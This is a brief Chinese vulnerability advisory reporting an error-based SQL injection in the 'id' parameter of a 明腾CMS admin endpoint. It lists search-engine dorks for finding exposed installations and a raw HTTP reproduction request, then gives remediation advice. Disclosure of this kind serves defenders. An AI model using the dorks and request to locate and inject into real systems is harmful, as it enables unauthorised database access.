**漏洞描述**

明腾CMS后台管理中心系统存在SQL注入漏洞。

 **空间测绘**

```
Fofa：title="明腾CMS管理中心"
quake：title:"明腾CMS管理中心"
hunter：web.title="明腾CMS管理中心a"
```

**漏洞复现**

访问如下路径会报错：

```
http://xxx.com/index.php?m=mingteng&c=Smstemplate&a=delTemplate&id=x
```

此处参数id存在SQL报错注入：

```yaml

GET /index.php?m=mingteng&c=Smstemplate&a=delTemplate&id=x HTTP/1.1
Host: xxx.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

**修复意见**

1、请联系厂商进行修复。 

2、如非必要，禁止公网访问该系统。 

3、设置白名单访问。